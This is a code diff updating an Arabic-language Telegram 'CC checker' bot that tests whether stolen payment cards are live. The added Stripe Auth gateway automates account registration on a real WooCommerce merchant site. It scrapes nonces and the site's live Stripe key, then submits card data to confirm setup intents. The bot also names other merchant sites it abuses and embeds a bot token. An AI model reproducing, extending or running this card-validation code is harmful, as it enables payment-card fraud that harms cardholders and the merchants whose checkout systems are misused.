@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Free Multi Gateway CC Checker Bot
-Version: 24.0 - Complete Multi Gateway (Stripe + Real Check + PayPal)
+Version: 25.0 - Updated Stripe Auth Gateway (UwU)
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -14,6 +14,12 @@ import platform
 
 print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
 print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")
+
+# Fix encoding for Windows terminal
+if sys.platform == 'win32':
+    import io
+    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
 
 # ==================== المكتبات المطلوبة ====================
 import time
@@ -34,7 +40,8 @@ import socketserver
 import shutil
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import argparse
-import io
+from types import NoneType
+from bs4 import BeautifulSoup
 
 # استيراد المكتبات الخارجية
 try:
@@ -55,11 +62,6 @@ warnings.filterwarnings("ignore")
 
 # تهيئة الألوان
 init(autoreset=True)
-
-# Fix encoding for Windows terminal
-if sys.platform == 'win32':
-    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
-    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
 
 # ==================== إعدادات البوت ====================
 BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
@@ -94,7 +96,7 @@ ERROR_FILE = os.path.join(DATA_FOLDER, "erro.txt")
 # ==================== إعدادات البوابات ====================
 GATES = {
     "stripe": {
-        "name": "💳 Stripe Gateway",
+        "name": "💳 Stripe Auth (UwU)",
         "command": "st",
         "mass_command": "mass",
         "icon": "💳",
@@ -291,7 +293,7 @@ class DataManager:
         if uid not in users:
             users[uid] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
         
-        is_approved = "✅" in result or "مقبولة" in result or "APPROVED" in result or "CHARGED" in result
+        is_approved = "✅" in result or "مقبولة" in result or "UwU" in result or "APPROVED" in result or "CHARGED" in result
         usage = users[uid]["usage"]
         usage["total_checks"] += 1
         
@@ -376,6 +378,21 @@ class Helpers:
     @staticmethod
     def get_bin_info(bin_num: str) -> Dict:
         try:
+            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_num[:6]}", timeout=5)
+            if r.status_code == 200:
+                data = r.json()
+                return {
+                    "brand": data.get('brand', 'Unknown').upper(),
+                    "bank": data.get('bank', 'Unknown'),
+                    "country": data.get('country_name', 'Unknown'),
+                    "flag": data.get('country_flag', '🏁'),
+                    "type": data.get('type', 'Unknown'),
+                    "level": data.get('level', 'Unknown')
+                }
+        except:
+            pass
+        
+        try:
             r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
             if r.status_code == 200:
                 data = r.json()
@@ -383,11 +400,14 @@ class Helpers:
                     "brand": data.get('scheme', 'Unknown').upper(),
                     "bank": data.get('bank', {}).get('name', 'Unknown'),
                     "country": data.get('country', {}).get('name', 'Unknown'),
-                    "flag": data.get('country', {}).get('emoji', '🏁')
+                    "flag": data.get('country', {}).get('emoji', '🏁'),
+                    "type": data.get('type', 'Unknown'),
+                    "level": data.get('level', 'Unknown')
                 }
         except:
             pass
-        return {"brand": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁"}
+        
+        return {"brand": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁", "type": "Unknown", "level": "Unknown"}
     
     @staticmethod
     def get_chat_type(chat_id: int) -> str:
@@ -395,10 +415,13 @@ class Helpers:
     
     @staticmethod
     def generate_random_email() -> str:
-        username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
-        number = random.randint(100, 9999)
-        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
-        return f"{username}{number}@{random.choice(domains)}"
+        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        return f"{username}@gmail.com"
+    
+    @staticmethod
+    def generate_random_password(length: int = 12) -> str:
+        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
+        return ''.join(random.choices(characters, k=length))
     
     @staticmethod
     def normalize_url(url: str) -> str:
@@ -424,7 +447,13 @@ class ResultFormatter:
         masked = f"{number[:6]}xxxxxx{number[-4:]}"
         status = "✅ LIVE - CARD APPROVED" if is_approved else "❌ DECLINED"
         
-        bin_text = f"\n𒊹︎︎︎ 𝗕𝗜𝗡 ⌁ {number[:6]}\n𒊹︎︎︎ 𝗕𝗥𝗔𝗡𝗗 ⌁ {bin_info.get('brand', 'Unknown')}\n𒊹︎︎︎ 𝗕𝗔𝗡𝗞 ⌁ {bin_info.get('bank', 'Unknown')}\n𒊹︎︎︎ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⌁ {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}" if bin_info else ""
+        bin_text = f"""
+𒊹︎︎︎ 𝗕𝗜𝗡 ⌁ {number[:6]}
+𒊹︎︎︎ 𝗕𝗥𝗔𝗡𝗗 ⌁ {bin_info.get('brand', 'Unknown')}
+𒊹︎︎︎ 𝗧𝗬𝗣𝗘 ⌁ {bin_info.get('type', 'Unknown')}
+𒊹︎︎︎ 𝗟𝗘𝗩𝗘𝗟 ⌁ {bin_info.get('level', 'Unknown')}
+𒊹︎︎︎ 𝗕𝗔𝗡𝗞 ⌁ {bin_info.get('bank', 'Unknown')}
+𒊹︎︎︎ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⌁ {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}""" if bin_info else ""
         
         return f"""
 🚀 {gate_name} 🚀
@@ -437,69 +466,218 @@ class ResultFormatter:
 🆔 Obeida Online | @ObeidaTrading
 """
 
-# ==================== بوابة Stripe (SetupIntent Auth) ====================
-class StripeGateway:
-    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
+# ==================== بوابة Stripe Auth (UwU) ====================
+class StripeAuthGateway:
+    """
+    Stripe SetupIntent Authentication Gateway
+    Based on the original Auth.py code
+    Site: copenhagensilver.com
+    """
+    
+    def __init__(self):
+        self.email = ""
+        self.password = ""
+        self.register_nonce = None
+        self.login_nonce = None
+        self.nonce = None
+        self.pk = None
+        self.token = None
+        self.guid = None
+        self.muid = None
+        self.sid = None
+    
+    def generate_random_email(self) -> str:
+        return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
+    
+    def generate_random_password(self) -> str:
+        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
+        return ''.join(random.choices(characters, k=12))
+    
+    async def get_register_nonce(self, session: aiohttp.ClientSession, url: str, headers: dict) -> Optional[str]:
+        async with session.get(url, headers=headers) as response:
+            html = await response.text()
+            match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
+            if match:
+                return match.group(1)
+            return None
+    
+    async def get_login_nonce(self, session: aiohttp.ClientSession, url: str, headers: dict) -> Optional[str]:
+        async with session.get(url, headers=headers) as response:
+            html = await response.text()
+            match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', html)
+            if match:
+                return match.group(1)
+            return None
+    
+    async def register_account(self, session: aiohttp.ClientSession, url: str, headers: dict, nonce: str) -> Tuple[str, str]:
+        email = self.generate_random_email()
+        password = self.generate_random_password()
+        
+        data = {
+            '_wp_http_referer': '/my-account/',
+            'email': email,
+            'password': password,
+            'woocommerce-register-nonce': nonce,
+            'register': 'Register'
+        }
+        
+        async with session.post(url, headers=headers, data=data) as response:
+            await response.text()
+            return email, password
+    
+    async def login_account(self, session: aiohttp.ClientSession, url: str, headers: dict, nonce: str, email: str, password: str) -> bool:
+        data = {
+            'username': email,
+            'password': password,
+            'woocommerce-login-nonce': nonce,
+            'login': 'Log in'
+        }
+        
+        async with session.post(url, headers=headers, data=data) as response:
+            return response.status == 200
+    
+    async def get_setup_intent_nonce_and_pk(self, session: aiohttp.ClientSession, url: str, headers: dict) -> Tuple[Optional[str], Optional[str]]:
+        async with session.get(url, headers=headers) as response:
+            data = await response.text()
+            nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', data)
+            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', data)
+            
+            nonce = nonce_match.group(1) if nonce_match else None
+            pk = pk_match.group(0) if pk_match else None
+            return nonce, pk
+    
+    async def create_payment_method(self, session: aiohttp.ClientSession, card_data: Dict, pk: str) -> Optional[str]:
+        url = "https://api.stripe.com/v1/payment_methods"
+        
+        self.guid = str(uuid.uuid4())
+        self.muid = str(uuid.uuid4())
+        self.sid = str(uuid.uuid4())
+        
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
+        }
+        
+        data = {
+            "type": "card",
+            "card[number]": card_data['number'],
+            "card[cvc]": card_data['cvv'],
+            "card[exp_year]": card_data['year'],
+            "card[exp_month]": card_data['month'],
+            "allow_redisplay": "unspecified",
+            "billing_details[address][country]": "EG",
+            "payment_user_agent": "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent",
+            "referrer": "https://copenhagensilver.com",
+            "time_on_page": str(random.randint(10000, 99999)),
+            "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
+            "client_attribution_metadata[merchant_integration_source]": "elements",
+            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
+            "client_attribution_metadata[merchant_integration_version]": "2021",
+            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
+            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
+            "client_attribution_metadata[elements_session_config_id]": str(uuid.uuid4()),
+            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
+            "guid": self.guid,
+            "muid": self.muid,
+            "sid": self.sid,
+            "key": pk,
+            "_stripe_version": "2024-06-20"
+        }
+        
+        async with session.post(url, headers=headers, data=data) as response:
+            result = await response.json()
+            return result.get("id")
+    
+    async def confirm_setup_intent(self, session: aiohttp.ClientSession, url: str, headers: dict, token: str, nonce: str) -> Tuple[bool, str]:
+        data = {
+            'action': 'wc_stripe_create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': token,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': nonce,
+        }
+        
+        async with session.post(url, headers=headers, data=data) as response:
+            try:
+                result = await response.json()
+                if result.get('success', False):
+                    return True, "✅ Card approved UwU"
+                else:
+                    error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
+                    return False, f"❌ {error_msg}"
+            except:
+                return False, "❌ Unexpected response"
+    
+    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
+        """
+        Check card using Stripe SetupIntent Authentication
+        Site: copenhagensilver.com
+        """
         try:
-            timeout = aiohttp.ClientTimeout(total=70)
-            connector = aiohttp.TCPConnector(ssl=False)
-            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-                ua_obj = UserAgent()
-                random_ua = ua_obj.random
-                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
-                domain = "https://cloud.vast.ai"
-                
-                stripe_headers = {
-                    'accept': 'application/json',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': 'https://js.stripe.com',
-                    'referer': 'https://js.stripe.com/',
-                    'user-agent': random_ua
+            async with aiohttp.ClientSession() as session:
+                base_url = "https://copenhagensilver.com/my-account/"
+                headers = {
+                    'referer': 'https://copenhagensilver.com/my-account/',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
                 }
                 
-                stripe_data = {
-                    'type': 'card',
-                    'card[number]': card_data['number'],
-                    'card[cvc]': card_data['cvv'],
-                    'card[exp_month]': card_data['month'],
-                    'card[exp_year]': card_data['year'],
-                    'allow_redisplay': 'unspecified',
-                    'billing_details[address][country]': 'US',
-                    'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
-                    'referrer': domain,
-                    'client_attribution_metadata[client_session_id]': Helpers.generate_guid(),
-                    'client_attribution_metadata[merchant_integration_source]': 'elements',
-                    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
-                    'client_attribution_metadata[merchant_integration_version]': '2021',
-                    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
-                    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
-                    'client_attribution_metadata[elements_session_config_id]': Helpers.generate_guid(),
-                    'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
-                    'guid': Helpers.generate_guid(),
-                    'muid': Helpers.generate_guid(),
-                    'sid': Helpers.generate_guid(),
-                    'key': stripe_key,
-                    '_stripe_version': '2024-06-20'
+                # Step 1: Get register nonce
+                register_nonce = await self.get_register_nonce(session, base_url, headers)
+                if not register_nonce:
+                    return False, "❌ Failed to extract register nonce"
+                
+                # Step 2: Register account
+                email, password = await self.register_account(session, base_url, headers, register_nonce)
+                self.email = email
+                self.password = password
+                
+                # Step 3: Get login nonce
+                login_nonce = await self.get_login_nonce(session, base_url, headers)
+                if not login_nonce:
+                    return False, "❌ Failed to extract login nonce"
+                
+                # Step 4: Login
+                await self.login_account(session, base_url, headers, login_nonce, email, password)
+                
+                # Step 5: Get SetupIntent nonce and Stripe PK
+                add_payment_url = "https://copenhagensilver.com/my-account/add-payment-method/"
+                headers['referer'] = 'https://copenhagensilver.com/my-account/payment-methods/'
+                
+                nonce, pk = await self.get_setup_intent_nonce_and_pk(session, add_payment_url, headers)
+                if not nonce or not pk:
+                    return False, "❌ SetupIntent nonce or Stripe PK not found"
+                
+                self.nonce = nonce
+                self.pk = pk
+                
+                # Step 6: Create payment method with Stripe
+                token = await self.create_payment_method(session, card_data, pk)
+                if not token:
+                    return False, "❌ Invalid card"
+                
+                self.token = token
+                
+                # Step 7: Confirm setup intent
+                ajax_url = "https://copenhagensilver.com/wp-admin/admin-ajax.php"
+                confirm_headers = {
+                    'authority': 'copenhagensilver.com',
+                    'accept': '*/*',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'origin': 'https://copenhagensilver.com',
+                    'referer': 'https://copenhagensilver.com/my-account/add-payment-method/',
+                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
+                    'x-requested-with': 'XMLHttpRequest',
                 }
                 
-                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
-                pm_json = await pm_resp.json()
+                success, message = await self.confirm_setup_intent(session, ajax_url, confirm_headers, token, nonce)
+                return success, message
                 
-                if 'error' in pm_json:
-                    err = pm_json['error']
-                    code = err.get('decline_code', '')
-                    message = err.get('message', '')
-                    if code in ['incorrect_cvc', 'invalid_cvc']:
-                        return True, "💳 CVV ERROR - Card is LIVE"
-                    elif code == 'insufficient_funds':
-                        return True, "💰 INSUFFICIENT FUNDS - Card is LIVE"
-                    elif 'expired' in message.lower():
-                        return False, "❌ EXPIRED CARD"
-                    return False, f"❌ DECLINED: {message[:50]}"
-                
-                return True, "✅ APPROVED"
         except Exception as e:
-            return False, f"⚠️ خطأ: {str(e)[:50]}"
+            return False, f"⚠️ Error: {str(e)[:50]}"
 
 # ==================== بوابة Real Check ====================
 class RealCheckGateway:
@@ -1081,13 +1259,13 @@ class PayPalGateway:
 # ==================== بوابات الفحص ====================
 class RealGateways:
     def __init__(self):
-        self.stripe = StripeGateway()
+        self.stripe = StripeAuthGateway()
         self.real = RealCheckGateway()
         self.paypal = PayPalGateway()
     
     async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
         if gate == 'stripe':
-            return await self.stripe.process_card(card)
+            return await self.stripe.check_card(card)
         elif gate == 'real':
             return await self.real.check_card(card)
         elif gate == 'paypal':
@@ -1149,7 +1327,7 @@ class CommandHandler:
             DataManager.save_users(users)
         
         default_gate = DataManager.get_user_default_gate(user.id)
-        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe")
+        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe Auth (UwU)")
         
         welcome = f"""
 ✨ <b>مرحباً بك في بوت Obeida Online</b> ✨
@@ -1158,15 +1336,15 @@ class CommandHandler:
 <b>💡 البوت مجاني بالكامل للجميع!</b>
 
 <b>📝 البوابات المتاحة:</b>
-💳 Stripe - فحص سريع
+💳 Stripe Auth (UwU) - فحص عبر SetupIntent
 ✅ Real Check - فحص حقيقي
 💰 PayPal - فحص PayPal
 
 <b>📝 الأوامر:</b>
-/st [البطاقة] - فحص عبر Stripe
+/st [البطاقة] - فحص عبر Stripe Auth
 /chk [البطاقة] - فحص عبر Real Check
 /pp [البطاقة] - فحص عبر PayPal
-/mass [ملف] - فحص ملف عبر Stripe
+/mass [ملف] - فحص ملف عبر Stripe Auth
 /chkm [ملف] - فحص ملف عبر Real Check
 /ppm [ملف] - فحص ملف عبر PayPal
 /stop - إيقاف الفحص
@@ -1202,7 +1380,7 @@ class CommandHandler:
 👤 <b>الملف الشخصي</b>
 ━━━━━━━━━━━━
 <b>🆔 المعرف:</b> <code>{user_id}</code>
-<b>🚪 البوابة:</b> {GATES.get(default_gate, {}).get('name', 'Stripe')}
+<b>🚪 البوابة:</b> {GATES.get(default_gate, {}).get('name', 'Stripe Auth')}
 <b>📊 الإحصائيات:</b>
 • إجمالي: {total}
 • ✅ المقبولة: {approved}
@@ -1549,16 +1727,16 @@ def setup():
                 handler.check_multiple_cards(m, cards, DataManager.get_user_default_gate(m.from_user.id))
         else:
             if Helpers.get_chat_type(m.chat.id) == "private":
-                bot.reply_to(m, "⚠️ أرسل البطاقة: <code>4111111111111111|12|25|123</code>\n\nالبوابات المتاحة:\n/st - Stripe\n/chk - Real Check\n/pp - PayPal", parse_mode='HTML', reply_markup=UserInterface.main_buttons())
+                bot.reply_to(m, "⚠️ أرسل البطاقة: <code>4111111111111111|12|25|123</code>\n\nالبوابات المتاحة:\n/st - Stripe Auth (UwU)\n/chk - Real Check\n/pp - PayPal", parse_mode='HTML', reply_markup=UserInterface.main_buttons())
     
     @bot.callback_query_handler(func=lambda c: True)
     def cb(c): callback.handle(c)
     
     print(Fore.GREEN + "✅ البوت جاهز!" + Style.RESET_ALL)
     print(Fore.CYAN + "📌 البوابات المتاحة:" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   💳 Stripe - /st و /mass" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   ✅ Real Check - /chk و /chkm" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   💰 PayPal - /pp و /ppm" + Style.RESET_ALL)
+    print(Fore.YELLOW + "   💳 Stripe Auth (UwU) - /st و /mass (copenhagensilver.com)" + Style.RESET_ALL)
+    print(Fore.YELLOW + "   ✅ Real Check - /chk و /chkm (cloud.vast.ai)" + Style.RESET_ALL)
+    print(Fore.YELLOW + "   💰 PayPal - /pp و /ppm (awwatersheds.org)" + Style.RESET_ALL)
     
     bot.infinity_polling()
 
